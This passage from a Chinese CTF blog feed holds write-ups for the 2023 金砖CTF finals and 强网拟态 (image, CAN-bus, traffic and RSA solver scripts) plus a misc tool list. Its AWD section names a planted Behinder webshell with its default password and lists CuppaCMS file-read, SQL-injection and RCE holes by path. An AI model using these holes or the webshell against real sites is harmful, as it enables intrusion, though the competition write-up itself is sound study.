class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>width,height = <span class="hljs-number">259</span>,<span class="hljs-number">259</span><br><br>im = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, (width, height))   <span class="hljs-comment">#创建图片</span><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rgb.txt&#x27;</span>)    <span class="hljs-comment">#打开rbg值的文件</span><br><span class="hljs-comment">#通过每个rgb点生成图片</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, width):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, height):<br>        line = file.readline().replace(<span class="hljs-string">&#x27;(&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-comment">#获取一行的rgb值</span><br>        rgb = line.split(<span class="hljs-string">&quot;,&quot;</span>)  <span class="hljs-comment">#分离rgb，文本中逗号后面有空格</span><br>        <span class="hljs-keyword">try</span>:<br>            im.putpixel((i, j), (<span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">0</span>]), <span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">1</span>]), <span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">2</span>])))    <span class="hljs-comment">#将rgb转化为像素</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>im.save(<span class="hljs-string">&quot;flag.png&quot;</span>)   <span class="hljs-comment">#im.save(&#x27;flag.jpg&#x27;)保存为jpg图片</span><br></code></pre></td></tr></table></figure><p>隐约看出有flag，仔细观察发现应该是宽太短了，应该要为高的2倍</p><figure><img src="/img/2023金砖CTF-决赛/17005673152429.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>尝试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>width,height = <span class="hljs-number">259</span>,<span class="hljs-number">518</span><br><br>im = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, (width, height))   <span class="hljs-comment">#创建图片</span><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rgb.txt&#x27;</span>)    <span class="hljs-comment">#打开rbg值的文件</span><br><span class="hljs-comment">#通过每个rgb点生成图片</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, width):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, height):<br>        line = file.readline().replace(<span class="hljs-string">&#x27;(&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-comment">#获取一行的rgb值</span><br>        rgb = line.split(<span class="hljs-string">&quot;,&quot;</span>)  <span class="hljs-comment">#分离rgb，文本中逗号后面有空格</span><br>        <span class="hljs-keyword">try</span>:<br>            im.putpixel((i, j), (<span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">0</span>]), <span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">1</span>]), <span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">2</span>])))    <span class="hljs-comment">#将rgb转化为像素</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>im.save(<span class="hljs-string">&quot;flag.png&quot;</span>)   <span class="hljs-comment">#im.save(&#x27;flag.jpg&#x27;)保存为jpg图片</span><br><br>img = im.transpose(Image.FLIP_LEFT_RIGHT) <br>img.save(<span class="hljs-string">&#x27;re_flag.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到</p><figure><img src="/img/2023金砖CTF-决赛/170056731524210.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="data_sec">data_sec</h2><h3 id="ant_pro">Ant_Pro</h3><p>蚁剑流量</p><p>简单看了一下有10个左右的包，其中有一个是有个zip的</p><p>定位到<code>stream 30</code>，有一串hex</p><figure><img src="/img/2023金砖CTF-决赛/170056731524211.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>转一下得到蚁剑的加密器源码，可以看到key是session的前16位，<code>AES-128-ECB</code>加密</p><figure><img src="/img/2023金砖CTF-决赛/170056731524212.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>利用这些信息可以解开数据包的请求与响应包</p><figure><img src="/img/2023金砖CTF-决赛/170056731524213.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>定位到<code>stream 20</code>和<code>stream 28</code></p><p><code>stream 20</code>的http流保存为<code>jt.zip</code>（注意不要用tcp，会有多余的分块传输的字节）</p><figure><img src="/img/2023金砖CTF-决赛/170056731524214.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p><code>stream 28</code>响应解密一下</p><figure><img src="/img/2023金砖CTF-决赛/170056731524215.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023金砖CTF-决赛/170056731524316.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023金砖CTF-决赛/170056731524317.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>得到压缩包密码，解压得到<code>jt.png</code></p><p>zsteg得到flag</p><figure><img src="/img/2023金砖CTF-决赛/170056731524318.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="ezph">ezPH</h3><p>一个数据包</p><p>tcp流前15个都是这样的求离散对数问题</p><figure><img src="/img/2023金砖CTF-决赛/170056731524319.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>第16个包很大，加载慢，使用tshark导出</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tshark</span> -r ezPH.pcapng -qz follow,tcp,raw,<span class="hljs-number">15</span> &gt; <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>两次hex转处理一下得到pdf头的文件</p><figure><img src="/img/2023金砖CTF-决赛/170056731524320.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>Pohlig-Hellman算法</p><figure><img src="/img/2023金砖CTF-决赛/170056731524321.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>后面不会了，交给队友</p><h1 id="awd">AWD</h1><p>D盾扫一下</p><figure><img src="/img/2023金砖CTF-决赛/170056731524322.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="漏洞1">漏洞1</h2><p>先看<code>/var/www/html/classes/.cuppa.php</code></p><p>冰蝎马，默认密钥，密码为<code>cuppa</code></p><figure><img src="/img/2023金砖CTF-决赛/170056731524323.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023金砖CTF-决赛/170056731524324.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="漏洞2">漏洞2</h2><p><code>/var/www/html/alerts/alertConfigField.php</code></p><p>include导致的任意文件读取</p><figure><img src="/img/2023金砖CTF-决赛/170056731524325.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>漏洞验证</p><figure><img src="/img/2023金砖CTF-决赛/170056731524426.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="漏洞3">漏洞3</h2><p><code>/var/www/html/alerts/alertLightbox.php</code></p><p>include导致的任意文件读取</p><figure><img src="/img/2023金砖CTF-决赛/170056731524427.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>漏洞验证</p><figure><img src="/img/2023金砖CTF-决赛/170056731524428.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="漏洞4">漏洞4</h2><p><code>/var/www/html/components/table_manager/html/list_admin_table.php</code></p><p><code>create_function</code>的rce（有<code>$cuppa-&gt;user-&gt;valid("admin_login");</code>要登录后台）</p><figure><img src="/img/2023金砖CTF-决赛/170056731524429.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>漏洞验证：</p><p>本地环境有问题，暂时无法验证，但是漏洞是存在的</p><h2 id="漏洞5">漏洞5</h2><p><code>/var/www/html/templates/default/html/windows/right.php</code></p><p>include导致的任意文件读取</p><figure><img src="/img/2023金砖CTF-决赛/170056731524430.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>漏洞验证</p><figure><img src="/img/2023金砖CTF-决赛/170056731524431.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="漏洞6">漏洞6</h2><p><code>/var/www/html/js/filemanager/api/index.php</code></p><p>目录穿越+删除文件+任意文件重命名+copy文件任意文件读取，参考https://github.com/CuppaCMS/CuppaCMS/issues/28</p><figure><img src="/img/2023金砖CTF-决赛/170056731524432.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="漏洞7">漏洞7</h2><p><code>/var/www/html/api/index.php</code></p><p>sql注入导致rce，参考https://github.com/CuppaCMS/CuppaCMS/issues/36</p><figure><img src="/img/2023金砖CTF-决赛/170056731524433.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="漏洞8">漏洞8</h2><p><code>/var/www/html/api/generic.php</code></p><p>sql注入</p><figure><img src="/img/2023金砖CTF-决赛/170056731524434.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="漏洞9">漏洞9</h2><p><code>/var/www/html/classes/ajax/Functions.php</code></p><p><code>saveConfigData</code>函数中代码可修改<code>Configuration.php</code>可导致写入webshell，具体参考https://github.com/CuppaCMS/CuppaCMS/issues/29</p><figure><img src="/img/2023金砖CTF-决赛/170056731524435.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h1 id="总结">总结</h1><p>ctf部分还是稍微可惜了一些，多10分钟可能就能拿多几分了</p><p>awd纯没经验，被打烂了</p><p>ps：awd漏洞没有复现的要么是本地环境有问题要么是可能没有这个漏洞</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
      <category>awd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023强网拟态</title>
    <link href="/2023/11/17/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/"/>
    <url>/2023/11/17/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/</url>
    
    <content type="html"><![CDATA[<h1 id="强网拟态">2023强网拟态</h1><h1 id="mimic">MIMIC</h1><h2 id="tbox-can">Tbox can</h2><p>参考 https://zhuanlan.zhihu.com/p/26394774https://blog.csdn.net/weixin_45403142/article/details/120075619</p><p>拿到一组can协议的数据包</p><p>根据网上相关文章搜索，大概了解到<code>control_field</code>给出指示后接的是<code>data_field</code>，里面是数据段</p><figure><img src="/img/2023强网拟态/17002015428102.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>根据包的特征，一次data有8个字节</p><p>先尝试将8个字节加在一起转16进制，得到<code>@DDHHLL@@DDHHLL@@DDHHLL@@DDHHLL@@DDHHLL@@DDHHLL@@DDHHLL@@DDHHLL</code>，但是错误的，单独将每一位转得到flag（脚本写的比较丑陋）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs PHP">import csv<br>csv_reader = csv.<span class="hljs-title function_ invoke__">reader</span>(<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&quot;can_data.csv&quot;</span>))<br><br>data = <span class="hljs-string">&#x27;data_field&#x27;</span><br>data_list = []<br><span class="hljs-keyword">for</span> row in csv_reader:<br>    <span class="hljs-keyword">if</span> data in row:<br>        data_list.<span class="hljs-title function_ invoke__">append</span>(row[<span class="hljs-number">6</span>])<br><span class="hljs-comment">#print(data_list)</span><br><br><span class="hljs-comment"># 错误的尝试，将每一部分的data加起来再16进制转字符</span><br><span class="hljs-comment"># passwd_list = []</span><br><span class="hljs-comment"># for i in range(0,len(data_list)-8,8):</span><br><span class="hljs-comment">#     passwd_list.append(int(data_list[i],16)+int(data_list[i+1],16)+int(data_list[i+2],16)+int(data_list[i+3],16)+int(data_list[i+4],16)+int(data_list[i+5],16)+int(data_list[i+6],16)+int(data_list[i+7],16))</span><br><span class="hljs-comment"># print(passwd_list)</span><br><br><span class="hljs-comment"># 每一个data数据16进制转字符</span><br>passwd_list = []<br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">0</span>,<span class="hljs-title function_ invoke__">len</span>(data_list)):<br>    passwd_list.<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-keyword">int</span>(data_list[i],<span class="hljs-number">16</span>))<br><span class="hljs-comment">#print(passwd_list)</span><br><br>passwd = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> x in passwd_list:<br>    <span class="hljs-keyword">if</span> <span class="hljs-number">32</span>&lt;x&lt;<span class="hljs-number">125</span>:<br>        passwd += <span class="hljs-title function_ invoke__">chr</span>(x)<br><span class="hljs-keyword">print</span>(passwd)<br><span class="hljs-comment">#??FSSID:HIGDDEN_HOHTPOT8$$\`PPASS:L0QGIC_ANAR1YSIS_CSAN_FOR_TFUN??????FSSID:HIGDDEN_HOHTPOT8$$\`PPASS:L0QGIC_ANAR1YSIS_CSAN_FOR_TFUN????</span><br></code></pre></td></tr></table></figure><p>稍微修改一下得到<code>PASS:L0GIC_ANA1YSIS_CAN_FOR_FUN</code></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;L0GIC_ANA1YSIS_CAN_FOR_FUN&#125;</span><br></code></pre></td></tr></table></figure><h1 id="misc">MISC</h1><h2 id="welcome">Welcome</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ZmxhZ3tNaW1pY195eWRzJkcwZF9Kb0JfQ1RGZXJ+<span class="hljs-attribute">fQ</span>==<br></code></pre></td></tr></table></figure><p>base64：<code>flag&#123;Mimic_yyds&amp;G0d_JoB_CTFer~&#125;</code></p><h2 id="国际象棋与二维码">国际象棋与二维码</h2><p>拿到一张经过处理的类似二维码的图</p><p>题目提示：你见过国际象棋的棋盘吗</p><p>联想到与国际象棋棋盘格式的图片异或</p><p>国际棋盘格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Plain">1 0 1 0 1 0<br>0 1 0 1 0 1<br>1 0 1 0 1 0<br>0 1 0 1 0 1<br>1 0 1 0 1 0<br>0 1 0 1 0 1<br></code></pre></td></tr></table></figure><p>这里有一个比较坑的点，给的题目格子数为49×49，但是像素是500×500的，直接用PIL库比较难处理</p><p>测试了很久得到以下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> cv2<br>att_image = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;attach.png&#x27;</span>)<br><span class="hljs-comment">#生成背景图</span><br>image = Image.new(mode=<span class="hljs-string">&#x27;RGBA&#x27;</span>, size=(<span class="hljs-number">500</span>, <span class="hljs-number">500</span>))<br><span class="hljs-comment">#image.save(&#x27;1.png&#x27;)</span><br><br>white_image = Image.new(mode=<span class="hljs-string">&#x27;RGB&#x27;</span>,size=(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>) ,color=<span class="hljs-string">&#x27;white&#x27;</span>)<br>black_image = Image.new(mode=<span class="hljs-string">&#x27;RGB&#x27;</span>,size=(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>) ,color=<span class="hljs-string">&#x27;black&#x27;</span>)<br><br><span class="hljs-comment">#生成500*500的国际棋盘图</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">49</span>):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">49</span>):<br>        <span class="hljs-keyword">if</span> (x % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> y % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>) <span class="hljs-keyword">or</span> (x % <span class="hljs-number">2</span> == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> y % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>): <span class="hljs-comment">#白色 奇数行奇数列 和 偶数行偶数列</span><br>            image.paste(white_image,(<span class="hljs-built_in">int</span>(x*(<span class="hljs-number">500</span>/<span class="hljs-number">49</span>)),<span class="hljs-built_in">int</span>(y*(<span class="hljs-number">500</span>/<span class="hljs-number">49</span>))))<br>            image.save(<span class="hljs-string">&#x27;1.png&#x27;</span>)<br>        <span class="hljs-keyword">elif</span> (x % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> y % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) <span class="hljs-keyword">or</span> (x % <span class="hljs-number">2</span> == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> y % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>): <span class="hljs-comment">#黑色 偶数行奇数列 和 奇数行偶数列</span><br>            image.paste(black_image,(<span class="hljs-built_in">int</span>(x*(<span class="hljs-number">500</span>/<span class="hljs-number">49</span>)),<span class="hljs-built_in">int</span>(y*(<span class="hljs-number">500</span>/<span class="hljs-number">49</span>))))<br>            image.save(<span class="hljs-string">&#x27;1.png&#x27;</span>)<br><br><span class="hljs-comment">#异或</span><br>img1 = cv2.imread(<span class="hljs-string">&#x27;1.png&#x27;</span>)<br>img2 = cv2.imread(<span class="hljs-string">&#x27;attach.png&#x27;</span>)<br>xor_img = cv2.bitwise_xor(img1,img2)<br>cv2.imshow(<span class="hljs-string">&#x27;img&#x27;</span>,xor_img)<br>cv2.imwrite(<span class="hljs-string">&#x27;flag.png&#x27;</span>,xor_img)<br></code></pre></td></tr></table></figure><figure><img src="/img/2023强网拟态/17002015428001.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>再看看别人队的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">#1</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>n = <span class="hljs-number">49</span><br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;attach.png&#x27;</span>)<br>width, height = img.size<br><br><span class="hljs-comment"># 0 -&gt; black</span><br>matrix = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">49</span>):<br>  tmp = []<br>  <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">49</span>):<br>    h = <span class="hljs-built_in">int</span>(i/<span class="hljs-number">49</span>*width+<span class="hljs-number">5</span>)<br>    w = <span class="hljs-built_in">int</span>(j/<span class="hljs-number">49</span>*height+<span class="hljs-number">5</span>)<br>    tmp += [<span class="hljs-built_in">int</span>(img.getpixel((w, h))[<span class="hljs-number">0</span>]/<span class="hljs-number">255</span>)]<br>  matrix += [tmp]<br><br>matrix2 = matrix.copy()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">49</span>):<br>  <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">49</span>):<br>    matrix2[i][j] ^= (i+j) % <span class="hljs-number">2</span><br><br>img2 = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (<span class="hljs-number">490</span>, <span class="hljs-number">490</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">49</span>):<br>  <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">49</span>):<br>    px = (matrix2[i][j]*<span class="hljs-number">255</span>,) * <span class="hljs-number">3</span><br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>      <span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        img2.putpixel((<span class="hljs-number">10</span>*i+p, <span class="hljs-number">10</span>*j+q), px)<br>img2.save(<span class="hljs-string">&#x27;qr.png&#x27;</span>)<br><br><span class="hljs-comment">#2</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>s=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;attach.png&#x27;</span>)<br>size=<span class="hljs-number">500</span><br>p=Image.new(<span class="hljs-string">&#x27;L&#x27;</span>,(<span class="hljs-number">49</span>,<span class="hljs-number">49</span>))<br><span class="hljs-keyword">for</span> yy <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">49</span>):<br>    <span class="hljs-keyword">for</span> xx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">49</span>):<br>        a=<span class="hljs-number">0</span><br>        b=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> s.getpixel((<span class="hljs-built_in">round</span>(<span class="hljs-number">500</span>/<span class="hljs-number">49</span>*xx+<span class="hljs-number">5</span>),<span class="hljs-built_in">round</span>(<span class="hljs-number">500</span>/<span class="hljs-number">49</span>*yy+<span class="hljs-number">5</span>)))[<span class="hljs-number">2</span>]&gt;<span class="hljs-number">128</span> :<br>            a=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> (xx+yy)%<span class="hljs-number">2</span>==<span class="hljs-number">1</span>:<br>            b=<span class="hljs-number">1</span><br>        p.putpixel((xx,yy),(a^b)*<span class="hljs-number">255</span>)<br>p.save(<span class="hljs-string">&#x27;out.png&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="crypto">CRYPTO</h1><h2 id="一眼看出">一眼看出</h2><p>p、q都相当于直接给了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>n = <span class="hljs-number">121027298948349995679677982412648544403333177260975245569073983061538581058440163574922807151182889153495253964764966037308461724272151584478723275142858008261257709817963330011376266261119767294949088397671360123321149414700981035517299807126625758046100840667081332434968770862731073693976604061597575813313</span><br>r = getPrime(<span class="hljs-number">6</span>)<br>e = <span class="hljs-number">65537</span><br>a = <span class="hljs-number">11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699</span><br>c = <span class="hljs-number">42256117129723577554705402387775886393426604555611637074394963219097781224776058009003521565944180241032100329456702310737369381890041336312084091995865560402681403775751012856436207938771611177592600423563671217656908392901713661029126149486651409531213711103407037959788587839729511719756709763927616470267</span><br>p = gmpy2.next_prime(a - r)<br>q = gmpy2.next_prime(gmpy2.next_prime(a) + r)<br><br>phi_n = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = gmpy2.invert(e,phi_n)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>misc</category>
      
      <category>crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>misc工具使用</title>
    <link href="/2023/11/06/misc%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/11/06/misc%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="misc工具使用">MISC工具使用</h1><h2 id="隐写">隐写</h2><h3 id="puzzlesolver">PuzzleSolver</h3><p>byxs20师傅的工具，综合利用工具，包括盲水印、fix_png、</p><h3 id="stegsolve"><strong>stegsolve</strong></h3><p>常用的lsb隐写工具，图形化</p><h3 id="ciphey">Ciphey</h3><p>带ai的自动解密工具 https://github.com/Ciphey/Ciphey<code>python3 -m pip install ciphey --upgrade</code></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">ciphey -<span class="hljs-built_in">t</span> <span class="hljs-string">&quot;encode message&quot;</span><br></code></pre></td></tr></table></figure><h3 id="gaps">gaps</h3><p>gap拼接图片</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">gaps --image=a.png --size=100 --save<br></code></pre></td></tr></table></figure><h3 id="steghide">steghide</h3><p>查看音频/图片文件隐藏内容，jpg、png、wav</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">steghide extract -sf 1.jpg -p password<br></code></pre></td></tr></table></figure><h3 id="stegseek">stegseek</h3><p>爆破steghide</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">stegseek 